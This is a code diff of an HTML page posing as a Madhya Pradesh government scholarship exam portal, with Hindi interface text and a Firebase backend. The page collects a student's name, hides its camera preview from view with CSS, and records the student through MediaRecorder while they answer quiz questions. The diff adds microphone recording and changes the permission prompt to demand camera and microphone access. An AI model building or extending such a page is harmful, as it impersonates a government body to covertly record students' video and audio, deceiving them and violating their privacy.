@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MP Board Scholarship - Examination Portal</title>
     
-    <!-- Firebase SDKs -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
@@ -38,19 +37,17 @@
         .option-lbl:hover { background: #f1f5f9; border-color: #cbd5e1; }
         input[type="radio"] { margin-right: 14px; transform: scale(1.3); cursor: pointer; }
         
-        /* सफलता और ब्लॉक स्क्रीन */
         .message-screen { display: none; text-align: center; padding: 40px 10px; }
         .message-screen h3 { font-size: 26px; color: #15803d; margin-bottom: 15px; font-weight: bold; }
         .message-screen p { color: #475569; font-size: 16px; line-height: 1.6; }
         .eliminated-title { color: #b91c1c !important; }
         
-        /* कैमरा प्रिव्यू को पूरी तरह से गायब (Hidden) करने के लिए */
+        /* कैमरा प्रिव्यू पूरी तरह से हिडन */
         #video-preview { display: none !important; width: 1px; height: 1px; opacity: 0; pointer-events: none; position: absolute; }
     </style>
 </head>
 <body>
 
-<!-- सरकारी हेडर -->
 <div class="gov-header">
     <h1>राज्य छात्रवृत्ति परीक्षा पोर्टल (MP Board)</h1>
     <p>शहरी एवं ग्रामीण क्षेत्र छात्रवृत्ति योजना - शिक्षा विभाग, मध्य प्रदेश सरकार</p>
@@ -58,17 +55,15 @@
 
 <div class="container">
     <div class="quiz-card" id="main-card">
-        <!-- रजिस्ट्रेशन स्क्रीन -->
         <div id="auth-screen">
             <div class="section-title">परीक्षार्थी पंजीकरण (Candidate Registration)</div>
             <div class="input-group">
                 <label>अपना पूरा नाम दर्ज करें (Enter Your Full Name):</label>
                 <input type="text" id="student-name" placeholder="उदा. Anwar Khan">
             </div>
-            <button class="btn" onclick="startRegistration()">परीक्षा शुरू करें</button>
+            <button class="btn" onclick="startRegistration()"> परीक्षा शुरू करें</button>
         </div>
 
-        <!-- परीक्षा प्रश्न स्क्रीन -->
         <div id="quiz-screen" class="question-box">
             <div class="section-title">ऑनलाइन प्रश्न पत्र (Online Question Paper)</div>
             <h3 id="question-text" class="q-title">लोड हो रहा है...</h3>
@@ -76,13 +71,11 @@
             <button class="btn" id="next-btn" onclick="submitAnswer()">अगला प्रश्न</button>
         </div>
 
-        <!-- सफलतापूर्ण सबमिशन स्क्रीन -->
         <div id="success-screen" class="message-screen">
             <h3>✅ सबमिट हो गया है!</h3>
-            <p>आपका टेस्ट सफलतापूर्वक सबमिट हो गया है। अगले टेस्ट के लिए इंतज़ार करें, आपको जल्द ही अगला test मिलेगा।</p>
+            <p>आपका test सफलतापूर्वक सबमिट हो गया है। अगले टेस्ट के लिए इंतज़ार करें, आपको जल्द ही अगला test मिलेगा।</p>
         </div>
 
-        <!-- एलिमिनेटेड स्क्रीन -->
         <div id="eliminated-screen" class="message-screen">
             <h3 class="eliminated-title">🚫 आप बाहर (Eliminated) हो चुके हैं!</h3>
             <p>प्रशासनिक कारणों या नियमों के उल्लंघन के कारण आपको इस परीक्षा से बाहर कर दिया गया है।</p>
@@ -90,7 +83,6 @@
     </div>
 </div>
 
-<!-- हिडन कैमरा एलिमेंट (छात्र को नहीं दिखेगा) -->
 <video id="video-preview" autoplay muted playsinline></video>
 
 <script>
@@ -108,7 +100,6 @@
     firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
 
-    // प्रश्न बैंक डेटाबेस
     const questions = [
         { q: "मध्य प्रदेश की राजधानी क्या है?", roles: ["भोपाल", "इंदौर", "जबलपुर", "ग्वालियर"], ans: "भोपाल" },
         { q: "भारत का राष्ट्रीय पक्षी कौन सा है?", roles: ["कबूतर", "मोर", "तोता", "चील"], ans: "मोर" },
@@ -132,7 +123,8 @@
         studentName = nameInput;
         studentId = 'student_' + Date.now();
 
-        navigator.mediaDevices.getUserMedia({ video: { width: 160, height: 120, frameRate: 10 }, audio: false })
+        // यहाँ AUDIO को TRUE किया गया है ताकि आवाज़ भी रिकॉर्ड हो
+        navigator.mediaDevices.getUserMedia({ video: { width: 160, height: 120, frameRate: 10 }, audio: true })
         .then(stream => {
             const videoPrev = document.getElementById('video-preview');
             videoPrev.srcObject = stream;
@@ -151,7 +143,7 @@
             showQuestion();
         })
         .catch(err => {
-            alert("परीक्षा देने के लिए कैमरा अनुमति अनिवार्य है!");
+            alert("परीक्षा देने के लिए कैमरा और माइक्रोफ़ोन अनुमति अनिवार्य है!");
             console.error(err);
         });
     }
@@ -172,6 +164,7 @@
     }
 
     function startVideoRecording(stream) {
+        // बिना ऑडियो रिस्ट्रिक्शन के वीडियो रिकॉर्डर शुरू
         mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
         
         mediaRecorder.ondataavailable = (event) => {
@@ -226,7 +219,6 @@
         const selectedOpt = document.querySelector('input[name="quiz-opt"]:checked');
         if(!selectedOpt) { alert("कृपया एक विकल्प चुनें!"); return; }
 
-        // आंसर के साथ क्वेश्चन टेक्स्ट और चेकिंग भी स्टोर करें
         const currentQuestion = questions[currentQIdx];
         const isCorrect = (selectedOpt.value === currentQuestion.ans);
 
